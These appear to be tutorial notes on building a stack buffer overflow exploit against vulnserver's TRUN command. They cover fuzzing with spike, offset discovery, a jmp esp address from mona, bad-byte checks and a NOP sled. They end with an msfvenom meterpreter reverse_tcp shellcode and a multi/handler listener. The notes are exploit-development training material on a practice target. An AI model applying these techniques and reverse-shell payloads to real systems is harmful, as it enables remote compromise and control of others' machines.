# first used a simple spike script to fuzz the application. shown below

s_readline();
s_string("TRUN ");
s_string_variable("FUZZ");

once the program crashes, follow the stack pointer in the address/hex dump to the beginning
where the payload starts which is address:


0x0407EF60 


then go to the end of the payload which is address:

0x0407FB00

Then finally subtract the end number from the beggining and you get:

2976



# used this to create a starting payload for vulnserver

msf-pattern_create -l 2976




# Pass the EIP in to msf-pattern_offset to get the correct offset for the buffer

386F4337 EIP (instruction pointer)



# Command used

msf-pattern_offset -q 386F4337


# Might need to specify the length like shown

msf-pattern_offset -l 2976 -q 386F4337


both commands show offset is at 2003


### it is good practice to maintain the same total length (2976) that we got the program to crash from originally using spike and just modify whats inside, rather than changing the length ### 

run our python script again once modified

now we have our EIP overwrite or control of the instruction pointer


also notice that the ESP register is filled with C's from our script, we can control those as
well




so the idea is that we make the instruction pointer execute where we want and we can package 
up shell code in that spot (ie shellcode would go in our C buffer where all the C's are
showing in immunity debugger) and make it call back to us with a reverse shell as an
example


basically we need to use some location that tells the EIP register, we want it to jump over to
the ESP register and execute the code thats included in that data

so we need to find a jmp esp instruction

we can use mona.py for that 

mona is a tool that we could use for this

in the debugger terminal at the bottom we can run 

!mono to bring up the module, then run 


#this tells mona we want to find a jmp instruction that jumps to the esp register
!mona jmp -r esp

copy the address you want from the results 

0x62501203  #this is our jmp esp instruction address

this can now be placed in our script in our new_eip

but first we need to convert it using the struct module in python 
(could also be done with pwntools)


it needs to be converted into something our program can understand, in this case it needs to
be in 32-bit little endian naming convention

the struct module in python has a pack function that will return a bytes object containing the
values v1,v2 packed according to the format string format, example:

new_eip = struct.pack("<I", 0x62501203)


the < specfies little endian while I specifies this is an unsigned integer that is 4 bytes in
size



(all of this info can be found in the python struct module documentation, specifically in the
pack funtion documentation)



Now we need to verify that our new EIP jumps to that instruction point, we can do that by
setting a breakpoint

restart the debugger then hit ctrl g to enter an expression to follow, we will past the 
value of where we know that we are going to jump to which would be the jmp esp address:

0x62501203

hit F2 to set a breakpoint here

now if we go and run our script, and then jump back to the debugger and we can see that our
eip is now at the jmp esp instruction

and if we hit F7 that wil jump us to our next instruction which is our C buffer 



#Bad Bytes


Some programs might not execute all of the code that you give it inside of shellcode, this is
because shell code is gonna make a lot of random new bytes that are gonna execute the
instructions and operations, to do whatever you want it to do, like get your meterpreter call
back or get your shell. But if a program is sensitive to that, it wont work. It will break, 


So we have to try to figure out what the bad bytes might be


the way we can do that, is by sending the program all of the characters, every potential byte
that our program might use

We can add a variable to our script called all_characters and set it equal to this: 


this uses list comprehension, the (256) represents all the ASCII characters we could
potentialy use


all_characters = [ x for x in range(256) ]


now we need to convert that x variable into a real byte that our program can understand,
passing it as an integer wont work. So we can use the struct module again for this. 

the < is for little endian and the B is for an unsigned char



all_characters = [ struct.pack('<B' ,x) for x in range(256) ]


if we test this with 

print(all_characters)
exit()

we notice right at the beggining we have a x00 or a NULL byte, in some low level languages a NULL byte means the end of
a string 

so we can change our range to specify a minimum value of 1

all_characters = [ struct.pack('<B' ,x) for x in range(1,256) ]

this removes the NULL byte at the start of our shellcode

Now we have added all_characters variable into our payload, and subtracted the length of it from our C buffer


We can run the script now and see that we hit our jump esp instruction, to the EIP 

and it looks like we are starting to execute some code shown below:

0102 

or the full instruction shown

0330F528   0102             ADD DWORD PTR DS:[EDX],EAX


now we can follow in dump and look at the last column of hex numbers and notice the pattern

there is a pattern alternating between 0 and 8 every other line, if this pattern stops between any of those 
characters then we would know something in that previous line was moved or mangled or something happened to it


in the debugger we got all the way to FF which means we didnt have any bad bytes other than the null byte

(screenshot example in folder checking-for-bad-bytes.img)


###IMPORTANT### 

checking for bad bytes is still something you need to do every single time. We got lucky that the TRUN function in
vulnserver doesnt require you to check for bad bytes but it is necessary to do it every time




Finally we now know that we have a section of characters that we can control, and that there arent any bad characters, we
know we can jump to it, and we can execute code off the stack. The hard part is we are kind of making this jump through
a trampoline sort of, but depending on uncertainty, something that we should do is put some sort of "cushion" or "sled"


something that your code and the program can sort of ride the flow down until it gets to your executable payload
or shellcode. Otherwise known as a NOP sled (No Operation sled)

NOP in assembly basically means dont do anything (hence no operation)

the opcode for NOP is x90

now we wanna go back to our payload and start to build a NOP sled, we can remove the all_characters variable from our
payload since we no longer need it to test

we create the nop sled in python like this:


#this can be as big as we want but for this tutorial its 16
nop_sled = b"\x90" * 16

###little explanation/recap###

After our new_eip variable in our payload, which we have controlled with our A padding to hit the new EIP
which is our jump esp instruction, that brings us to what would be the C buffer, the shellcode we create is going to go
in our C buffer

Now we want to put shellcode there and we want to slide down to execute our shell code, so our NOP sled will go between
our new_eip and our C buffer

also make sure to subtract the length of our nop_sled from our C buffer 

We can test this again if we want to make sure everything still works

restart the program in immunity and set a breakpoint at the jump esp address again using ctrl g to 
jump to the address and then F2 to set the breakpoint

everything works, we can see the jump our eip makes and then with F7 we can see our NOP sled and then the C buffer


So we can move over to craft shellcode with msfvenom

The -f specifies the format, which is python

msfvenom -p windows/meterpreter/reverse_tcp LHOST=eth0 LPORT=4444 -f py 


notice our payload we generated has null bytes, to avoid this use:

-b "\x00" 

also any other bad bytes found could also be specifed like that, example:

-b "\x00\xfe\xb4" 

this basically tells msfvenmom we cant have those in our payload

it is important to know our payload size, which shows 381 bytes, right now since we have used 2003 bytes 
of our 2984 total we have around 980 bytes to use. 


If you ever run into a problem where you dont have enough bytes to use youve gotta do some other tricks (out of the
scope of this tutorial)


just after the NOP sled is where we are gonna place our shellcode

and again make sure to subtract our shellcode from our C buffer


now we have an exploit script that we have built


we can go into msfconsole and use the multi/handler module with the payload set as 
windows/meterpreter/reverse_tcp and run it